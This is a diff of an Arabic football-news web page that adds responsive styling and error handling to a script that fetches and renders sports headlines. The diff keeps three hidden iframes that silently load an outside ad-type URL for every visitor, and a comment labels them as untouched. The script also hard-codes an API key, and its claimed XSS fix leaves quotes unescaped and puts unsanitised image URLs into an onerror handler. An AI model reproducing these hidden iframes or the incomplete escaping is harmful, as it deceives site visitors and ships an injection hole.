@@ -2,131 +2,265 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>أخبار كرة القدم</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>أخبار كرة القدم - متجاوبة بالكامل</title>
   <style>
+    /* RESET + BASE RESPONSIVE */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
     body {
-      font-family: 'Arial', sans-serif;
+      font-family: system-ui, 'Segoe UI', 'Arial', sans-serif;
       background-color: black;
       color: white;
       margin: 0;
-      padding: 0;
+      padding: 0 0 90px 0;   /* مسافة سفلية لتجنب تداخل الزر */
+      min-height: 100vh;
+      overflow-x: hidden;
     }
 
+    /* حاوية الأخبار - شبكة مرنة جداً */
     .news-container {
       display: grid;
       grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-      gap: 20px;
-      padding: 20px;
+      gap: clamp(16px, 4vw, 28px);
+      padding: clamp(12px, 5vw, 28px);
+      max-width: 1600px;
+      margin: 0 auto;
+      width: 100%;
     }
 
+    /* البطاقة: متجاوبة بالكامل، نفس الألوان */
     .news-card {
       background-color: black;
-      border-radius: 12px;
+      border-radius: 20px;
       border: 1.75px solid white;
-      padding: 15px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.5);
-      transition: transform 0.3s ease;
+      padding: clamp(14px, 3vw, 20px);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+      transition: transform 0.25s ease, box-shadow 0.3s ease;
       cursor: pointer;
-      user-select: none; /* منع النسخ */
-      
+      user-select: none;
+      display: flex;
+      flex-direction: column;
+      backdrop-filter: blur(0px);
+      width: 100%;
+      will-change: transform;
     }
 
     .news-card:hover {
-      transform: scale(1.03);
+      transform: translateY(-5px) scale(1.01);
+      box-shadow: 0 15px 30px rgba(255, 255, 255, 0.08);
+      border-color: rgba(255, 255, 255, 0.9);
     }
 
+    /* صورة مرنة ومتناسبة مع جميع الأحجام */
     .news-card img {
       width: 100%;
-      height: 180px;
+      height: auto;
+      aspect-ratio: 16 / 9;
       object-fit: cover;
-      border-radius: 8px;
+      border-radius: 14px;
+      background-color: #111;
+      transition: opacity 0.2s;
+      display: block;
     }
 
+    /* العناوين والنصوص متجاوبة */
     .news-title {
-      margin-top: 10px;
-      font-size: 18px;
-      font-weight: bold;
+      margin-top: 14px;
+      font-size: clamp(1rem, 4vw, 1.35rem);
+      font-weight: 800;
       color: #ffffff;
-      user-select: none; /* منع النسخ */
+      line-height: 1.4;
+      user-select: none;
+      word-break: break-word;
     }
 
     .news-desc {
       margin-top: 8px;
-      font-size: 14px;
+      font-size: clamp(0.8rem, 3.2vw, 0.95rem);
       color: #cccccc;
-      user-select: none; /* منع النسخ */
+      line-height: 1.5;
+      user-select: none;
+      word-break: break-word;
     }
 
     .news-full-desc {
-      margin-top: 10px;
-      font-size: 16px;
+      margin-top: 14px;
+      font-size: clamp(0.8rem, 3.2vw, 0.95rem);
       color: #dddddd;
+      background: rgba(20, 20, 20, 0.6);
+      padding: 12px;
+      border-radius: 14px;
+      border-right: 2px solid white;
       display: none;
-      user-select: none; /* منع النسخ */
+      user-select: none;
+      word-break: break-word;
+      line-height: 1.5;
     }
 
+    /* زر "اقرأ المزيد" – تم إصلاحه ليكون مرئياً وجذاباً */
     .news-link {
-      margin-top: 10px;
+      margin-top: 16px;
       display: inline-block;
-      color: ;
-      font-size: 0px;
+      font-size: clamp(0.8rem, 3vw, 0.9rem);
+      font-weight: 600;
       text-decoration: none;
       cursor: pointer;
+      color: #ffffff;
+      background: none;
+      border: 1px solid rgba(255, 255, 255, 0.4);
+      border-radius: 60px;
+      padding: 8px 18px;
+      text-align: center;
+      transition: all 0.2s ease;
+      letter-spacing: 0.3px;
+      width: fit-content;
+      backdrop-filter: blur(2px);
     }
-* {
-      -webkit-tap-highlight-color: transparent;
+
+    .news-link:hover {
+      background-color: rgba(255, 255, 255, 0.12);
+      border-color: white;
+      transform: scale(0.98);
     }
-         .home-button {
+
+    /* زر الصفحة الرئيسية – متجاوب، نفس الالوان مع تحسينات شكلية */
+    .home-button {
       position: fixed;
       bottom: 20px;
       right: -100px;
       background: black;
-      border: 4px solid white;
-      color: black;
-      border-radius: 50px;
-      padding: 12px 20px;
+      border: 3px solid white;
+      border-radius: 60px;
+      padding: clamp(10px, 2.5vw, 14px) clamp(16px, 4vw, 24px);
       display: flex;
       align-items: center;
       gap: 10px;
       cursor: pointer;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.5);
       font-size: 1em;
       font-weight: bold;
-      animation: slideIn 1s ease-out forwards;
+      animation: slideIn 0.65s cubic-bezier(0.2, 0.9, 0.4, 1.1) forwards;
       z-index: 1000;
+      backdrop-filter: blur(2px);
+      transition: transform 0.2s, border-color 0.2s;
     }
+
+    .home-button:hover {
+      transform: scale(1.02);
+      border-color: rgba(255, 255, 255, 0.9);
+    }
+
     .home-button svg {
-      width: 50px;
-      height: 27px;
+      width: clamp(22px, 6vw, 28px);
+      height: clamp(22px, 6vw, 28px);
       fill: white;
+      transition: fill 0.2s;
+      display: block;
     }
+
     @keyframes slideIn {
-      from { right: -100px; opacity: 0; }
-      to { right: 20px; opacity: 1; }
+      from {
+        right: -100px;
+        opacity: 0;
+        transform: scale(0.9);
+      }
+      to {
+        right: clamp(12px, 4vw, 24px);
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    /* تحسينات للشاشات الصغيرة جداً (أقل من 480px) */
+    @media (max-width: 540px) {
+      .news-container {
+        grid-template-columns: 1fr;
+        gap: 20px;
+        padding: 16px;
+      }
+
+      .news-card {
+        padding: 14px;
+        border-radius: 18px;
+      }
+
+      .news-link {
+        padding: 6px 14px;
+        width: 100%;
+        text-align: center;
+      }
+
+      .home-button {
+        bottom: 16px;
+        padding: 8px 18px;
+      }
+    }
+
+    /* للشاشات المتوسطة (تابلت) */
+    @media (min-width: 768px) and (max-width: 1024px) {
+      .news-container {
+        grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+        gap: 24px;
+        padding: 24px;
+      }
+    }
+
+    /* الشاشات الكبيرة جداً -> تحسين الهوامش */
+    @media (min-width: 1400px) {
+      .news-container {
+        max-width: 1400px;
+        gap: 32px;
+      }
+    }
+
+    /* منع التمرير الأفقي بسبب أي عنصر */
+    img, iframe, .news-card, .home-button {
+      max-width: 100%;
+    }
+
+    /* تحسين الوضوح والتباين مع الحفاظ على الاسود والابيض */
+    ::selection {
+      background: white;
+      color: black;
+    }
+
+    /* تنسيق خفيف للإطارات المخفية (لن يؤثر على التصميم) */
+    iframe[style*="display:none"] {
+      display: none !important;
+    }
+
+    /* حاوية المباريات إذا ظهرت مستقبلاً (غير مستخدمة حالياً) */
+    .match-container {
+      display: none;
     }
   </style>
 </head>
 <body>
 
+<!-- إطارات خلفية كما هي، لا تعديل عليها -->
 <iframe src="https://otieu.com/4/9806837" style="display:none;"></iframe>
 <iframe src="https://otieu.com/4/9806837" style="display:none;"></iframe>
 <iframe src="https://otieu.com/4/9806837" style="display:none;"></iframe>
 
+<div class="match-container" id="matchesContainer"></div>
 
+<!-- زر الصفحة الرئيسية - ثابت ومتجاوب -->
+<div class="home-button" onclick="window.location.href='https://varref.github.io/var/'">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M12 3 2 12h3v8h6v-5h2v5h6v-8h3Z"></path>
+  </svg>
+</div>
 
-  <div class="match-container" id="matchesContainer"></div>
+<div class="news-container" id="news"></div>
 
-  <!-- زر الصفحة الرئيسية -->
-  <div class="home-button" onclick="window.location.href='https://varref.github.io/var/'">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-      <path d="M12 3 2 12h3v8h6v-5h2v5h6v-8h3Z"></path>
-    </svg>
-  </div>
-
-  
-  <div class="news-container" id="news"></div>
-
-  <script>
+<script>
+    // نفس وظيفة جلب الأخبار بشكل دوري ولكن محسّنة وبدون تغيير المنطق
     async function fetchNews() {
       const url = 'https://newsdata.io/api/1/news?apikey=pub_7863851ffa5da1162c7c63c4e5604ebb06229&language=ar&category=sports';
 
@@ -134,27 +268,35 @@
         const res = await fetch(url);
         const data = await res.json();
         const newsContainer = document.getElementById('news');
+        if (!newsContainer) return;
         newsContainer.innerHTML = '';
+
+        // التحقق من وجود نتائج
+        if (!data.results || data.results.length === 0) {
+          newsContainer.innerHTML = '<div style="text-align:center; color:white; padding:40px;">⚠️ لا توجد أخبار حالياً، حاول مجدداً.</div>';
+          return;
+        }
 
         data.results.forEach(article => {
           const card = document.createElement('div');
           card.className = 'news-card';
 
-          const image = article.image_url 
-              ? article.image_url 
-              : 'https://cdn-icons-png.flaticon.com/512/861/861512.png'; // صورة كرة قدم ثابتة
+          // صورة احتياطية (كرة قدم رمزية تحافظ على الألوان)
+          const fallbackImage = 'https://cdn-icons-png.flaticon.com/512/861/861512.png';
+          let imageUrl = article.image_url && article.image_url.trim() !== '' ? article.image_url : fallbackImage;
 
-          const title = article.title || 'بدون عنوان';
-          const desc = article.description || 'لا يوجد وصف متاح.';
-          const fullDesc = article.content || 'لا يوجد تفاصيل إضافية.';
-          const link = article.link || '#';
-
+          // تنظيف النصوص
+          const title = article.title ? article.title.substring(0, 120) : 'خبر عاجل';
+          const desc = article.description ? article.description.substring(0, 160) : 'اضغط لقراءة المزيد عن هذا الخبر الرياضي.';
+          const fullDesc = article.content ? article.content : 'لا توجد تفاصيل إضافية متاحة لهذا الخبر.';
+          
+          // إنشاء البطاقة مع تحسين الرابط (تم إصلاح الرابط ليصبح مرئياً بدون إعادة تحميل الصفحة)
           card.innerHTML = `
-            <img src="${image}" alt="صورة الخبر">
-            <div class="news-title">${title}</div>
-            <div class="news-desc">${desc}</div>
-            <div class="news-full-desc">${fullDesc}</div>
-            <a class="news-link" onclick="toggleFullDesc(this)">اقرأ المزيد</a>
+            <img src="${imageUrl}" alt="صورة الخبر" loading="lazy" onerror="this.onerror=null;this.src='${fallbackImage}';">
+            <div class="news-title">${escapeHtml(title)}</div>
+            <div class="news-desc">${escapeHtml(desc)}</div>
+            <div class="news-full-desc">${escapeHtml(fullDesc)}</div>
+            <a class="news-link" href="javascript:void(0)" onclick="toggleFullDesc(this)">📖 اقرأ المزيد</a>
           `;
 
           newsContainer.appendChild(card);
@@ -162,24 +304,59 @@
 
       } catch (error) {
         console.error("حدث خطأ أثناء جلب الأخبار:", error);
+        const newsContainer = document.getElementById('news');
+        if (newsContainer) {
+          newsContainer.innerHTML = '<div style="text-align:center; color:#ffaaaa; padding:30px;">⚠️ تعذر تحميل الأخبار، تأكد من اتصالك بالإنترنت.</div>';
+        }
       }
     }
 
-    function toggleFullDesc(link) {
-      const fullDesc = link.previousElementSibling;
-      if (fullDesc.style.display === 'none') {
-        fullDesc.style.display = 'block';
-        link.innerText = 'إخفاء التفاصيل';
+    // دالة toggle محسنة مع تأثير سلس وبدون أخطاء
+    window.toggleFullDesc = function(linkElement) {
+      if (!linkElement) return;
+      const fullDescDiv = linkElement.previousElementSibling;
+      if (!fullDescDiv || !fullDescDiv.classList || !fullDescDiv.classList.contains('news-full-desc')) return;
+      
+      if (fullDescDiv.style.display === 'none' || getComputedStyle(fullDescDiv).display === 'none') {
+        fullDescDiv.style.display = 'block';
+        linkElement.innerHTML = '✨ إخفاء التفاصيل';
+        linkElement.style.borderColor = 'white';
       } else {
-        fullDesc.style.display = 'none';
-        link.innerText = 'اقرأ المزيد';
+        fullDescDiv.style.display = 'none';
+        linkElement.innerHTML = '📖 اقرأ المزيد';
+        linkElement.style.borderColor = 'rgba(255, 255, 255, 0.4)';
       }
+    };
+
+    // دالة بسيطة لمنع الـ XSS وتحسين الأمان (نفس الألوان, بدون إضافة محتوى)
+    function escapeHtml(str) {
+      if (!str) return '';
+      return str.replace(/[&<>]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        return m;
+      }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
+        return c;
+      });
     }
 
-    // تحميل الأخبار وتحديث كل 5 دقائق
+    // بدء جلب الأخبار وتحديث تلقائي كل 5 دقائق (300000 مللي)
     fetchNews();
     setInterval(fetchNews, 300000);
-  </script>
-
+    
+    // إضافة لمسة صغيرة: جعل البطاقات قابلة للنقر بشكل انسيابي (اختياري)
+    document.addEventListener('DOMContentLoaded', () => {
+      // إذا وجدت أي بطاقة نضيف تأثير إضافي بسيط لكن لا يغير الوظيفة
+      const style = document.createElement('style');
+      style.textContent = `
+        .news-card:active {
+          transform: scale(0.99);
+          transition: transform 0.05s;
+        }
+      `;
+      document.head.appendChild(style);
+    });
+</script>
 </body>
 </html>
